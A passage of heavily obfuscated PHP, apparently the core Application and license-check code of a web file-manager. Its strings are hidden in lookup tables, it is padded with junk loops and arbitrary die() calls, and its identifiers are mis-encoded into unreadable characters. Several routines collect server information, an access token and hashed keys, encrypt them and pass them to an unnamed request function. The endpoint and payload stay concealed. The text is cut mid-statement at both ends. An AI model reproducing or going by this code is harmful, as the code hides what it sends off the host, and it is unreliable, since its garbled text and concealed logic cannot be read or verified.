$íËä⁄éË[$©ÁœŒ⁄œ[952]])) : $©ÁœŒ⁄œ[22]); $…ñ¡∑˜ˆ[] = trim(implode($©ÁœŒ⁄œ[63], $ÙÅÜ÷ùÀ)); } $≠˜˘ÀÏı = array($©ÁœŒ⁄œ[1129] . $¶¡∂éÃ∆ . $©ÁœŒ⁄œ[1130], $©ÁœŒ⁄œ[1131] . $¶¡∂éÃ∆ . $©ÁœŒ⁄œ[1132], implode($©ÁœŒ⁄œ[60] . PHP_EOL, $…ñ¡∑˜ˆ), $©ÁœŒ⁄œ[949]); $µ·Ä«ﬂÏ = implode(PHP_EOL, array_merge($≠˜˘ÀÏı, $ˆÄ⁄√á˜)); if ($ª¢õõ˘ê && $ª¢õõ˘ê == $©ÁœŒ⁄œ[23]) { return $µ·Ä«ﬂÏ; } $€ÃÆû… = array($©ÁœŒ⁄œ[811] => $ »ŸãÍø, $©ÁœŒ⁄œ[23] => $µ·Ä«ﬂÏ); return $ª¢õõ˘ê ? $€ÃÆû…[$ª¢õõ˘ê] : $€ÃÆû…; } public function sqlFromSqlite($ÏÁ‘èà≠, $”Ö∏∞∏≥ = '') { $∑ü†â∫˙ =& $_SERVER[Á≈ ä ∞]; $¸˛Ëª•€ = $this->model()->db(); $Ö∑—í±í = "\x50\122\101\107\115\x41\x20\x54\101\102\x4c\105\x5f\x49\116\x46\x4f\x20\x28\47{$ÏÁ‘èà≠}\47\51"; $ªà”˙÷ı = "\x53\105\x4c\105\103\124\x20\52\40\x46\x52\117\x4d\40\163\161\154\151\x74\x65\x5f\155\141\163\x74\x65\x72\x20\x57\110\105\122\105\x20\x74\142\x6c\137\156\141\x6d\145\x20\x3d\40\47{$ÏÁ‘èà≠}\x27"; $î≠î“π“ = $¸˛Ëª•€->query($Ö∑—í±í); if (empty($î≠î“π“)) { $÷ó∞õ•· = array($∑ü†â∫˙[811] => $∑ü†â∫˙[22], $∑ü†â∫˙[23] => $∑ü†â∫˙[22]); return $”Ö∏∞∏≥ ? $÷ó∞õ•·[$”Ö∏∞∏≥] : $÷ó∞õ•·; } $ãáÏ˙±» = $¸˛Ëª•€->query($ªà”˙÷ı); $¸À˝Ëùﬂ = $îõΩ•í‚ = array(); foreach ($ãáÏ˙±» as $ü¥‰ó≥÷) { if ($ü¥‰ó≥÷[$∑ü†â∫˙[43]] == $∑ü†â∫˙[288]) { $¸À˝Ëùﬂ[] = $ü¥‰ó≥÷[$∑ü†â∫˙[1133]]; } else { $îõΩ•í‚[$ü¥‰ó≥÷[$∑ü†â∫˙[42]]] = $ü¥‰ó≥÷[$∑ü†â∫˙[1133]]; } } $œî⁄äÍÌ = array_merge(array($∑ü†â∫˙[1129] . $ÏÁ‘èà≠ . $∑ü†â∫˙[128]), $¸À˝Ëùﬂ, array_values($îõΩ•í‚)); $œî⁄äÍÌ = implode($∑ü†â∫˙[81] . PHP_EOL, $œî⁄äÍÌ) . $∑ü†â∫˙[81]; if ($”Ö∏∞∏≥ && $”Ö∏∞∏≥ == $∑ü†â∫˙[23]) { return $œî⁄äÍÌ; } $∞π¯õªƒ = array(); $÷–”‹˝Ê = array($∑ü†â∫˙[1121] => $∑ü†â∫˙[1134], $∑ü†â∫˙[324] => $∑ü†â∫˙[1135]); $àÌ¢èÏÑ = $∑ü†â∫˙[22]; foreach ($î≠î“π“ as $ü¥‰ó≥÷) { if ($ü¥‰ó≥÷[$∑ü†â∫˙[67]] == $∑ü†â∫˙[98]) { $àÌ¢èÏÑ = $ü¥‰ó≥÷[$∑ü†â∫˙[42]]; } $≠∏êËÈ¿ = array($∑ü†â∫˙[394] . $ü¥‰ó≥÷[$∑ü†â∫˙[42]] . $∑ü†â∫˙[394], isset($÷–”‹˝Ê[$ü¥‰ó≥÷[$∑ü†â∫˙[43]]]) ? $÷–”‹˝Ê[$ü¥‰ó≥÷[$∑ü†â∫˙[43]]] : $ü¥‰ó≥÷[$∑ü†â∫˙[43]], $ü¥‰ó≥÷[$∑ü†â∫˙[45]] == $∑ü†â∫˙[98] ? $∑ü†â∫˙[1126] : $∑ü†â∫˙[1136] . $ü¥‰ó≥÷[$∑ü†â∫˙[66]], $ü¥‰ó≥÷[$∑ü†â∫˙[67]] == $∑ü†â∫˙[98] ? $∑ü†â∫˙[1137] : $∑ü†â∫˙[22]); $∞π¯õªƒ[] = trim(implode($∑ü†â∫˙[63], $≠∏êËÈ¿)); } foreach ($îõΩ•í‚ as $ŒÛù©Å¸ => $Üﬂú”Â≤) { $ô‰öÄ • = str_replace($∑ü†â∫˙[1138] . $ÏÁ‘èà≠ . $∑ü†â∫˙[21], $∑ü†â∫˙[22], $ŒÛù©Å¸); $æ‚˛ÿÇ† = str_replace(array($∑ü†â∫˙[128], $∑ü†â∫˙[960]), $∑ü†â∫˙[394], substr($Üﬂú”Â≤, stripos($Üﬂú”Â≤, $∑ü†â∫˙[269]))); if ($ô‰öÄ • == $∑ü†â∫˙[1115]) { $“ÿöØåÒ = $∑ü†â∫˙[1139] . $àÌ¢èÏÑ . $∑ü†â∫˙[1140]; } else { $“ÿöØåÒ = (stripos($ô‰öÄ •, $∑ü†â∫˙[21]) ? $∑ü†â∫˙[1141] : $∑ü†â∫˙[22]) . ($∑ü†â∫˙[1142] . $ô‰öÄ • . $∑ü†â∫˙[1143] . $æ‚˛ÿÇ†); } $∞π¯õªƒ[] = $“ÿöØåÒ; } $„˝ ˙™¥ = array($∑ü†â∫˙[1144] . $ÏÁ‘èà≠ . $∑ü†â∫˙[1145], $∑ü†â∫˙[1146] . $ÏÁ‘èà≠ . $∑ü†â∫˙[1147], implode($∑ü†â∫˙[60] . PHP_EOL, $∞π¯õªƒ), $∑ü†â∫˙[1148]); $Éù°‡œ∆ = implode(PHP_EOL, $„˝ ˙™¥); if ($”Ö∏∞∏≥ && $”Ö∏∞∏≥ == $∑ü†â∫˙[811]) { return $Éù°‡œ∆; } $÷ó∞õ•· = array($∑ü†â∫˙[811] => $Éù°‡œ∆, $∑ü†â∫˙[23] => $œî⁄äÍÌ); return $”Ö∏∞∏≥ ? $÷ó∞õ•·[$”Ö∏∞∏≥] : $÷ó∞õ•·; } } goto aµéÔàìŸÈ; e∏≠ó°º€ï: while (strlen($xpcazdruws) < $_SERVER[Á≈ ä ∞][627]) { if (!$xpcazdruws) { break; } $xpcazdruws++; } class Application { private $defaultModule = "\x69\156\144\145\170"; private $defaultController = "\151\x6e\144\145\170"; private $defaultAction = "\x69\x6e\144\145\170"; function __construct() { } public function setDefault($§¬õ“”Â) { $óéë◊ú∂ =& $_SERVER[•çºﬂ„ù]; $Ù¢ÇŸÅ· = explode($óéë◊ú∂[0], trim($§¬õ“”Â, $óéë◊ú∂[0])); $this->defaultModule = $Ù¢ÇŸÅ·[0] ? $Ù¢ÇŸÅ·[0] : $this->defaultModule; $this->defaultController = $Ù¢ÇŸÅ·[1] ? $Ù¢ÇŸÅ·[1] : $this->defaultController; $this->defaultAction = $Ù¢ÇŸÅ·[2] ? $Ù¢ÇŸÅ·[2] : $this->defaultAction; $this->xnljee9f02f9($óéë◊ú∂[1], array($this, $óéë◊ú∂[2])); } public function appRun($ùÑ≤ÎÖΩ) { $Å÷ƒ‡§ƒ =& $_SERVER[•çºﬂ„ù]; $æäï¬¨ = explode($Å÷ƒ‡§ƒ[0], $ùÑ≤ÎÖΩ); $”™ÄÂÑ‰ = strtolower($æäï¬¨[0]); $Î´ı‘£ = $Å÷ƒ‡§ƒ[3]; if ($”™ÄÂÑ‰ == $Å÷ƒ‡§ƒ[4]) { $Î´ı‘£ = $Å÷ƒ‡§ƒ[5]; $æäï¬¨[0] = $Å÷ƒ‡§ƒ[6]; $æäï¬¨[1] = $æäï¬¨[1] . $Å÷ƒ‡§ƒ[7]; $ùÑ≤ÎÖΩ = join($Å÷ƒ‡§ƒ[0], $æäï¬¨); $ùÑ≤ÎÖΩ = trim($ùÑ≤ÎÖΩ, $Å÷ƒ‡§ƒ[0]); } call_user_func(array($Å÷ƒ‡§ƒ[8], $Å÷ƒ‡§ƒ[9]), $Î´ı‘£ . $Å÷ƒ‡§ƒ[10], $ùÑ≤ÎÖΩ); ActionCall($ùÑ≤ÎÖΩ); $ûÀ…∂¡„ = $_SERVER[Á≈ ä ∞][628]; call_user_func(array($Å÷ƒ‡§ƒ[8], $Å÷ƒ‡§ƒ[9]), $Î´ı‘£ . $Å÷ƒ‡§ƒ[11], $ùÑ≤ÎÖΩ); } private function autorun() { $πøœºØ© =& $_SERVER[Á≈ ä ∞]; $ñÈıÈÑÙ =& $_SERVER[•çºﬂ„ù]; global $config; $ü˚±ô‹§ = $πøœºØ©[629]; while (strlen($ü˚±ô‹§) < $πøœºØ©[630]) { if (!$ü˚±ô‹§) { break; } $ü˚±ô‹§++; } if (count($config[$ñÈıÈÑÙ[12]]) == 0) { return; } foreach ($config[$ñÈıÈÑÙ[12]] as $–ôôÊ¿„ => $“æõ”Ù‹) { $this->appRun($“æõ”Ù‹); } } private function uovc2bc667f5() { $¡ƒˆ©º” =& $_SERVER[Á≈ ä ∞]; $§è˙Ñßã =& $_SERVER[•çºﬂ„ù]; $∑îûÊå = $§è˙Ñßã[4]; $ñÿüØ… = $GLOBALS[$§è˙Ñßã[13]][$§è˙Ñßã[14]][0]; if (!$ñÿüØ… || strlen($ñÿüØ…) <= strlen($∑îûÊå)) { return; } if (strtolower(substr($ñÿüØ…, -strlen($∑îûÊå))) != $∑îûÊå) { return; } $¿Å˜òèâ = substr($ñÿüØ…, 0, -strlen($∑îûÊå)); $°äıúÛú = $¡ƒˆ©º”[631]; if (strlen($°äıúÛú) < $¡ƒˆ©º”[630]) { die; } $ã§Ó»áˆ = array($§è˙Ñßã[4], $¿Å˜òèâ); $∑±˜§ÒÜ = array_slice($GLOBALS[$§è˙Ñßã[13]][$§è˙Ñßã[14]], 1); $GLOBALS[$§è˙Ñßã[13]][$§è˙Ñßã[14]] = array_merge($ã§Ó»áˆ, $∑±˜§ÒÜ); $GLOBALS[$§è˙Ñßã[13]][$§è˙Ñßã[15]] = implode($§è˙Ñßã[0], $GLOBALS[$§è˙Ñßã[13]][$§è˙Ñßã[14]]); $«’≤Ü◊‹ = $¡ƒˆ©º”[632]; } private function sulg0994bf2d() { $ïø≤Ñ¿˚ =& $_SERVER[Á≈ ä ∞]; $íËûãì =& $_SERVER[•çºﬂ„ù]; if ($GLOBALS[$íËûãì[13]][$íËûãì[15]] != $íËûãì[6]) { return; } $ÁÓÎƒÿñ = $_SERVER[$íËûãì[16]]; $ﬂ÷É˘ã = $ïø≤Ñ¿˚[633]; $¥£îˆÑ∫ = $íËûãì[17]; $ÁŸ˙¢‹˘ = $ïø≤Ñ¿˚[634]; if (!$ÁŸ˙¢‹˘) { die; } if (!strstr($ÁÓÎƒÿñ, $¥£îˆÑ∫)) { return; } $—Àπ∞µÖ = strrpos($ÁÓÎƒÿñ, $¥£îˆÑ∫); $Ï›∆Ù˚¢ = $ïø≤Ñ¿˚[635]; $ ∫ﬁûîÛ = substr($ÁÓÎƒÿñ, $—Àπ∞µÖ + strlen($¥£îˆÑ∫)); $Æ¬Ô“®ﬁ = $ïø≤Ñ¿˚[636]; while ($Æ¬Ô“®ﬁ < $ïø≤Ñ¿˚[630]) { if ($Æ¬Ô“®ﬁ >= 0) { break; } $Æ¬Ô“®ﬁ++; } preg_match_all($íËûãì[18], $ ∫ﬁûîÛ, $¸Ìòµçå); $îÓÁüáË = $ïø≤Ñ¿˚[637]; if (strlen($îÓÁüáË) < $ïø≤Ñ¿˚[638]) { die; } $ ∫ﬁûîÛ = trim($¸Ìòµçå[0][0], $íËûãì[19]); $GLOBALS[$íËûãì[13]][$íËûãì[14]] = explode($íËûãì[19], $ ∫ﬁûîÛ); $Ñ™…ØΩ• = $ïø≤Ñ¿˚[639]; if (strlen($Ñ™…ØΩ•) < $ïø≤Ñ¿˚[627]) { return; } $GLOBALS[$íËûãì[13]][$íËûãì[15]] = implode($íËûãì[0], $GLOBALS[$íËûãì[13]][$íËûãì[14]]); } public function run() { $†π‚‰î¬ =& $_SERVER[Á≈ ä ∞]; $‘˚˚è◊˚ =& $_SERVER[•çºﬂ„ù]; $this->sulg0994bf2d(); $this->uovc2bc667f5(); $î°ÌÄæê = $†π‚‰î¬[640]; if (strlen($î°ÌÄæê) < $†π‚‰î¬[12]) { die; } $˜ÁÄ€Ì§ = $GLOBALS[$‘˚˚è◊˚[13]][$‘˚˚è◊˚[14]]; $ππÊÖ»Œ = $†π‚‰î¬[641]; $ã®Œ≤≠… = $GLOBALS[$‘˚˚è◊˚[13]][$‘˚˚è◊˚[15]]; $óÎ§Ï€¸ = $†π‚‰î¬[642]; while ($óÎ§Ï€¸ < $†π‚‰î¬[627]) { if ($óÎ§Ï€¸ >= 0) { break; } $óÎ§Ï€¸++; } define($‘˚˚è◊˚[20], isset($˜ÁÄ€Ì§[0]) && $˜ÁÄ€Ì§[0] ? $˜ÁÄ€Ì§[0] : $this->defaultModule); define($‘˚˚è◊˚[21], isset($˜ÁÄ€Ì§[1]) && $˜ÁÄ€Ì§[0] ? $˜ÁÄ€Ì§[1] : $this->defaultController); define($‘˚˚è◊˚[22], isset($˜ÁÄ€Ì§[2]) && $˜ÁÄ€Ì§[0] ? $˜ÁÄ€Ì§[2] : $this->defaultAction); $É˚◊„Ω° = $†π‚‰î¬[643]; if (strlen($É˚◊„Ω°) < $†π‚‰î¬[630]) { return; } define($‘˚˚è◊˚[23], MOD . $‘˚˚è◊˚[0] . ST . $‘˚˚è◊˚[0] . ACT); $ıÁáπêæ = $†π‚‰î¬[644]; if (!$ıÁáπêæ) { return; } $_SERVER[$‘˚˚è◊˚[24]] = strtolower(ACTION); $˛Á˜Í∆Æ = $†π‚‰î¬[645]; if (strlen($˛Á˜Í∆Æ) < $†π‚‰î¬[12]) { die; } $this->autorun(); if (count($˜ÁÄ€Ì§) >= 3) { $this->appRun($ã®Œ≤≠…); } else { $this->appRun(ACTION); } } private $lirg56a9754c = array(); private $lhaf7e17defe = ''; public function bfhk06e8ec13() { $à‚„ÕÍ =& $_SERVER[Á≈ ä ∞]; $°ﬂ€®˛Á =& $_SERVER[•çºﬂ„ù]; $this->dhzg79e1c220(); $this->xmzac7fee5f4(); $¿ﬂÉî≥Ç = $à‚„ÕÍ[646]; if (!$¿ﬂÉî≥Ç) { return; } $this->yzgo43c52100(); $this->vpca6c289a2e(); $this->xsbvb1bbea2a(); $˙û¥Ö€˚ = $à‚„ÕÍ[647]; $this->wgnbaeb22dd9(); $this->nsmida1d2094(); $¯Ë‰ØÏﬂ = $à‚„ÕÍ[648]; if (strlen($¯Ë‰ØÏﬂ) < $à‚„ÕÍ[627]) { die; } $this->xnljee9f02f9($°ﬂ€®˛Á[25], array($this, $°ﬂ€®˛Á[26])); $this->xnljee9f02f9($°ﬂ€®˛Á[27], array($this, $°ﬂ€®˛Á[28])); $–‹äÙ®˜ = $à‚„ÕÍ[649]; while ($–‹äÙ®˜ < $à‚„ÕÍ[627]) { if ($–‹äÙ®˜ >= 0) { break; } $–‹äÙ®˜++; } $this->xnljee9f02f9($°ﬂ€®˛Á[29], array($this, $°ﬂ€®˛Á[30])); $this->xnljee9f02f9($°ﬂ€®˛Á[31], array($this, $°ﬂ€®˛Á[32])); $˚èòﬁö‹ = $à‚„ÕÍ[650]; } public function obug9e36607d($çï◊™†¶) { $©˜ƒÖŸò =& $_SERVER[Á≈ ä ∞]; $ÒœÎïúÒ =& $_SERVER[•çºﬂ„ù]; $”ˆîÅº“ = Model($ÒœÎïúÒ[33])->get(); $É–ƒ≤∫È = array($ÒœÎïúÒ[34], $ÒœÎïúÒ[35], $ÒœÎïúÒ[36], $ÒœÎïúÒ[37], $ÒœÎïúÒ[38], $ÒœÎïúÒ[39], $ÒœÎïúÒ[40], $ÒœÎïúÒ[41], $ÒœÎïúÒ[42], $ÒœÎïúÒ[43], $ÒœÎïúÒ[44], $ÒœÎïúÒ[45], $ÒœÎïúÒ[46], $ÒœÎïúÒ[47], $ÒœÎïúÒ[48], $ÒœÎïúÒ[49], $ÒœÎïúÒ[50], $ÒœÎïúÒ[51], $ÒœÎïúÒ[52], $ÒœÎïúÒ[53], $ÒœÎïúÒ[54], $ÒœÎïúÒ[55], $ÒœÎïúÒ[56], $ÒœÎïúÒ[57], $ÒœÎïúÒ[58], $ÒœÎïúÒ[59], $ÒœÎïúÒ[60], $ÒœÎïúÒ[61], $ÒœÎïúÒ[62], $ÒœÎïúÒ[63], $ÒœÎïúÒ[64], $ÒœÎïúÒ[65], $ÒœÎïúÒ[66], $ÒœÎïúÒ[67], $ÒœÎïúÒ[68], $ÒœÎïúÒ[69], $ÒœÎïúÒ[70], $ÒœÎïúÒ[71], $ÒœÎïúÒ[72], $ÒœÎïúÒ[73], $ÒœÎïúÒ[74], $ÒœÎïúÒ[75], $ÒœÎïúÒ[76], $ÒœÎïúÒ[77], $ÒœÎïúÒ[78], $ÒœÎïúÒ[79], $ÒœÎïúÒ[80], $ÒœÎïúÒ[81], $ÒœÎïúÒ[82], $ÒœÎïúÒ[83]); foreach ($É–ƒ≤∫È as $ªπ¯‚©Ÿ) { $ΩÑÃ˝Êã = $GLOBALS[$ÒœÎïúÒ[84]][$ÒœÎïúÒ[85]][$ªπ¯‚©Ÿ]; if (isset($”ˆîÅº“[$ªπ¯‚©Ÿ])) { $ΩÑÃ˝Êã = $”ˆîÅº“[$ªπ¯‚©Ÿ]; } $çï◊™†¶[$ÒœÎïúÒ[86]][$ÒœÎïúÒ[87]][$ªπ¯‚©Ÿ] = $ΩÑÃ˝Êã; } $¨≥üëµ„ = $çï◊™†¶[$ÒœÎïúÒ[86]][$ÒœÎïúÒ[87]][$ÒœÎïúÒ[46]]; $Â€ÄµÑÿ = $©˜ƒÖŸò[651]; if (strlen($Â€ÄµÑÿ) < $©˜ƒÖŸò[627]) { die; } unset($çï◊™†¶[$ÒœÎïúÒ[86]][$ÒœÎïúÒ[88]][$ÒœÎïúÒ[89]]); unset($çï◊™†¶[$ÒœÎïúÒ[86]][$ÒœÎïúÒ[88]][$ÒœÎïúÒ[90]]); unset($çï◊™†¶[$ÒœÎïúÒ[86]][$ÒœÎïúÒ[87]][$ÒœÎïúÒ[46]]); unset($çï◊™†¶[$ÒœÎïúÒ[86]][$ÒœÎïúÒ[87]][$ÒœÎïúÒ[91]]); $çï◊™†¶[$ÒœÎïúÒ[86]][$ÒœÎïúÒ[87]][$ÒœÎïúÒ[92]] = array($ÒœÎïúÒ[93] => (int) $¨≥üëµ„[$ÒœÎïúÒ[94]], $ÒœÎïúÒ[95] => (int) _get($¨≥üëµ„, $ÒœÎïúÒ[96], 0)); $çï◊™†¶[$ÒœÎïúÒ[97]][$ÒœÎïúÒ[98]] = Action($ÒœÎïúÒ[99])->accessToken(); $çï◊™†¶[$ÒœÎïúÒ[97]][$ÒœÎïúÒ[100]] = md5($_SERVER[$ÒœÎïúÒ[101]] . $”ˆîÅº“[$ÒœÎïúÒ[102]]); $ñ◊√»∆… = $©˜ƒÖŸò[652]; $çï◊™†¶[$ÒœÎïúÒ[97]][$ÒœÎïúÒ[103]] = base64_encode(serverInfo()); $çï◊™†¶[$ÒœÎïúÒ[97]][$ÒœÎïúÒ[104]] = $this->lhaf7e17defe; $êŸÈÁàﬁ = $©˜ƒÖŸò[653]; if (strlen($êŸÈÁàﬁ) < $©˜ƒÖŸò[654]) { die; } if ($”ˆîÅº“[$ÒœÎïúÒ[104]] != $ÒœÎïúÒ[105]) { $çï◊™†¶[$ÒœÎïúÒ[97]][$ÒœÎïúÒ[106]] = $”ˆîÅº“[$ÒœÎïúÒ[106]]; $çï◊™†¶[$ÒœÎïúÒ[97]][$ÒœÎïúÒ[107]] = $”ˆîÅº“[$ÒœÎïúÒ[107]]; $√“µœÉ» = rand_string(10) . $this->lhaf7e17defe . rand_string(5); $çï◊™†¶[$ÒœÎïúÒ[86]][$ÒœÎïúÒ[108]][$ÒœÎïúÒ[109]] = $this->uxwa163bee30($√“µœÉ», $çï◊™†¶[$ÒœÎïúÒ[97]][$ÒœÎïúÒ[100]]); } if ($this->lhaf7e17defe == $ÒœÎïúÒ[105]) { $çï◊™†¶[$ÒœÎïúÒ[86]][$ÒœÎïúÒ[87]][$ÒœÎïúÒ[92]][$ÒœÎïúÒ[96]] = 0; } $çï◊™†¶[$ÒœÎïúÒ[97]][$ÒœÎïúÒ[110]] = _get($this->lirg56a9754c, $ÒœÎïúÒ[111], $ÒœÎïúÒ[6]); $çï◊™†¶[$ÒœÎïúÒ[97]][$ÒœÎïúÒ[112]] = _get($this->lirg56a9754c, $ÒœÎïúÒ[113], $ÒœÎïúÒ[6]); $∑ñú∂’Ì = $©˜ƒÖŸò[655]; if (_get($GLOBALS, $ÒœÎïúÒ[114]) && $this->config[$ÒœÎïúÒ[115]]) { $çï◊™†¶[$ÒœÎïúÒ[97]][$ÒœÎïúÒ[116]] = WEB_ROOT; } return $çï◊™†¶; } private function wgnbaeb22dd9() { $êÉÓ∑∑Ó =& $_SERVER[Á≈ ä ∞]; $Ñ¢óπ¢ó =& $_SERVER[•çºﬂ„ù]; $îØè›≈Â = $_SERVER[$Ñ¢óπ¢ó[24]] == $Ñ¢óπ¢ó[117]; if ($_SERVER[$Ñ¢óπ¢ó[24]] == $Ñ¢óπ¢ó[118] && $_GET[$Ñ¢óπ¢ó[119]] == $Ñ¢óπ¢ó[120]) { $îØè›≈Â = !0; } if ($îØè›≈Â) { $√äÿ…Ω÷ = array($Ñ¢óπ¢ó[104] => $this->lhaf7e17defe, $Ñ¢óπ¢ó[121] => $this->siay0482e76c(), $Ñ¢óπ¢ó[122] => Model($Ñ¢óπ¢ó[123])->count()); if ($this->lhaf7e17defe != $Ñ¢óπ¢ó[105]) { $“æπ“˚ÿ = _get($this->lirg56a9754c, $Ñ¢óπ¢ó[124]); if ($“æπ“˚ÿ) { $√äÿ…Ω÷[$Ñ¢óπ¢ó[125]] = $“æπ“˚ÿ; $√äÿ…Ω÷[$Ñ¢óπ¢ó[126]] = strtotime(_get($this->lirg56a9754c, $Ñ¢óπ¢ó[127])); $√äÿ…Ω÷[$Ñ¢óπ¢ó[128]] = _get($this->lirg56a9754c, $Ñ¢óπ¢ó[113]); } $›ó¨ëôÏ = Model($Ñ¢óπ¢ó[33])->get($Ñ¢óπ¢ó[129], $Ñ¢óπ¢ó[6], !0); if (is_string($›ó¨ëôÏ) && substr($›ó¨ëôÏ, 0, 1) == $Ñ¢óπ¢ó[130]) { $›ó¨ëôÏ = json_decode_force($›ó¨ëôÏ); } if (is_array($›ó¨ëôÏ) && $›ó¨ëôÏ[$Ñ¢óπ¢ó[131]] && strstr($›ó¨ëôÏ[$Ñ¢óπ¢ó[131]], $Ñ¢óπ¢ó[132])) { $√Ç Ó”í = explode($Ñ¢óπ¢ó[132], $›ó¨ëôÏ[$Ñ¢óπ¢ó[131]]); $√äÿ…Ω÷[$Ñ¢óπ¢ó[133]] = $√Ç Ó”í[0]; } } $√äÿ…Ω÷ = $this->vlcpb3de8e7d(json_encode($√äÿ…Ω÷), md5($Ñ¢óπ¢ó[134])); $Ò£±ôÍ– = array($Ñ¢óπ¢ó[135] => $√äÿ…Ω÷); call_user_func(array($Ñ¢óπ¢ó[136], $Ñ¢óπ¢ó[137]), $Ò£±ôÍ–); $æ⁄π∫÷§ = $êÉÓ∑∑Ó[656]; while ($æ⁄π∫÷§ < $êÉÓ∑∑Ó[654]) { if ($æ⁄π∫÷§ >= 0) { break; } $æ⁄π∫÷§++; } } if ($this->lhaf7e17defe == $Ñ¢óπ¢ó[105]) { return; } $±äΩ«¢ø = array($Ñ¢óπ¢ó[138], $Ñ¢óπ¢ó[139], $Ñ¢óπ¢ó[140], $Ñ¢óπ¢ó[141], $Ñ¢óπ¢ó[142], $Ñ¢óπ¢ó[143]); $õˆÒ¿´˘ = $êÉÓ∑∑Ó[657]; if (strlen($õˆÒ¿´˘) < $êÉÓ∑∑Ó[12]) { die; } $…‹“∫·á = Model($Ñ¢óπ¢ó[33])->get(); $ò¸Øﬁ∫î = $êÉÓ∑∑Ó[658]; if (!$ò¸Øﬁ∫î) { die; } $Ò£±ôÍ– = array($Ñ¢óπ¢ó[144] => $…‹“∫·á[$Ñ¢óπ¢ó[34]], $Ñ¢óπ¢ó[145] => $…‹“∫·á[$Ñ¢óπ¢ó[35]], $Ñ¢óπ¢ó[146] => $Ñ¢óπ¢ó[6]); $Øà¢ÀãÇ = $êÉÓ∑∑Ó[659]; foreach ($±äΩ«¢ø as $â…ìÛ¬) { if (!isset($…‹“∫·á[$â…ìÛ¬]) || !$…‹“∫·á[$â…ìÛ¬]) { continue; } $Ò£±ôÍ–[$â…ìÛ¬] = $…‹“∫·á[$â…ìÛ¬]; } call_user_func(array($Ñ¢óπ¢ó[136], $Ñ¢óπ¢ó[137]), $Ò£±ôÍ–); } private function vpca6c289a2e() { $◊‰ÓñèÖ =& $_SERVER[Á≈ ä ∞]; $òç∏¸ıÑ =& $_SERVER[•çºﬂ„ù]; if ($_SERVER[$òç∏¸ıÑ[24]] != $òç∏¸ıÑ[147]) { return; } if (!_get($GLOBALS, $òç∏¸ıÑ[114])) { die; } $¡ŒóπâÅ = $GLOBALS[$òç∏¸ıÑ[13]]; if (isset($¡ŒóπâÅ[$òç∏¸ıÑ[148]])) { $this->npyvdee67221(); die; } if (!isset($¡ŒóπâÅ[$òç∏¸ıÑ[149]]) || strlen($¡ŒóπâÅ[$òç∏¸ıÑ[149]]) != 16) { show_json($òç∏¸ıÑ[150] . $¡ŒóπâÅ[$òç∏¸ıÑ[149]], !1); } $â›⁄åÍñ = Model($òç∏¸ıÑ[33])->get($òç∏¸ıÑ[102]); $∂™•Ííà = md5($_SERVER[$òç∏¸ıÑ[101]] . $â›⁄åÍñ); $€˘â‚ü£ = $◊‰ÓñèÖ[660]; if (!$€˘â‚ü£) { die; } $”ÿ¸é˘· = array($òç∏¸ıÑ[149] => $¡ŒóπâÅ[$òç∏¸ıÑ[149]], $òç∏¸ıÑ[151] => rand_string(16), $òç∏¸ıÑ[152] => $òç∏¸ıÑ[134], $òç∏¸ıÑ[153] => $òç∏¸ıÑ[154], $òç∏¸ıÑ[155] => $_SERVER[$òç∏¸ıÑ[156]], $òç∏¸ıÑ[157] => $_SERVER[$òç∏¸ıÑ[158]], $òç∏¸ıÑ[159] => $_SERVER[$òç∏¸ıÑ[160]], $òç∏¸ıÑ[100] => $∂™•Ííà, $òç∏¸ıÑ[161] => Model($òç∏¸ıÑ[33])->get($òç∏¸ıÑ[129])); if ($¡ŒóπâÅ[$òç∏¸ıÑ[162]] == $òç∏¸ıÑ[163]) { $©∞·Ù°˛ = $this->vlcpb3de8e7d($∂™•Ííà, $òç∏¸ıÑ[164]); $’˝®å¯« = $this->uxwa163bee30(json_encode($”ÿ¸é˘·), $∂™•Ííà . $òç∏¸ıÑ[165], 3); $’˝®å¯« = $’˝®å¯« . $òç∏¸ıÑ[166] . $_SERVER[$òç∏¸ıÑ[156]]; $Úì´¬…∂ = $this->rsjfb8b17b67($òç∏¸ıÑ[167] . $©∞·Ù°˛ . $òç∏¸ıÑ[168] . $’˝®å¯«, -1); show_json($Úì´¬…∂, !0); } else { if ($¡ŒóπâÅ[$òç∏¸ıÑ[162]] == $òç∏¸ıÑ[169]) { $ª¡µ⁄Í§ = substr(md5($òç∏¸ıÑ[170] . $∂™•Ííà), 12, 15) . $òç∏¸ıÑ[171]; $’˝®å¯« = $this->adfpf153236a(trim($¡ŒóπâÅ[$òç∏¸ıÑ[172]]), $ª¡µ⁄Í§, 2); $úÛ“´»‹ = json_decode($’˝®å¯«, !0); if (!is_array($úÛ“´»‹) || !is_array($úÛ“´»‹[$òç∏¸ıÑ[173]]) || $úÛ“´»‹[$òç∏¸ıÑ[149]] != !0) { $∂óÂ◊»ﬁ = $òç∏¸ıÑ[174]; $˜›ìïÏÊ = $úÛ“´»‹[$òç∏¸ıÑ[173]] ? $òç∏¸ıÑ[175] . $úÛ“´»‹[$òç∏¸ıÑ[173]] : $∂óÂ◊»ﬁ; show_json($˜›ìïÏÊ, !1); } else { $”ÿ¸é˘·[$òç∏¸ıÑ[151]] = $úÛ“´»‹[$òç∏¸ıÑ[173]][$òç∏¸ıÑ[176]]; } } else { $úÛ“´»‹ = $this->rsjfb8b17b67($òç∏¸ıÑ[177], $”ÿ¸é˘·, 10); $¯ÂØ¿ªù = $◊‰ÓñèÖ[661]; if (strlen($¯ÂØ¿ªù) < $◊‰ÓñèÖ[654]) { die; } } } if (!is_array($úÛ“´»‹) || !is_array($úÛ“´»‹[$òç∏¸ıÑ[173]]) || $úÛ“´»‹[$òç∏¸ıÑ[149]] != !0) { $∂óÂ◊»ﬁ = LNG($òç∏¸ıÑ[178]); $˜›ìïÏÊ = $úÛ“´»‹[$òç∏¸ıÑ[173]] ? $òç∏¸ıÑ[175] . $úÛ“´»‹[$òç∏¸ıÑ[173]] : $∂óÂ◊»ﬁ; show_json($˜›ìïÏÊ, !1); } $¢ŸÉÁû˘ = $úÛ“´»‹[$òç∏¸ıÑ[173]]; $ÔíÇ™ÅÏ = $this->ivardc74abb8($¢ŸÉÁû˘[$òç∏¸ıÑ[179]]); if (!$ÔíÇ™ÅÏ || $ÔíÇ™ÅÏ != $¢ŸÉÁû˘[$òç∏¸ıÑ[127]]) { $®˙ÙùΩñ = array($òç∏¸ıÑ[180] => Model($òç∏¸ıÑ[33])->get($òç∏¸ıÑ[102]), $òç∏¸ıÑ[181] => $_SERVER[$òç∏¸ıÑ[101]], $òç∏¸ıÑ[182] => this_url(), $òç∏¸ıÑ[157] => $_SERVER[$òç∏¸ıÑ[158]]); $’˝®å¯« = 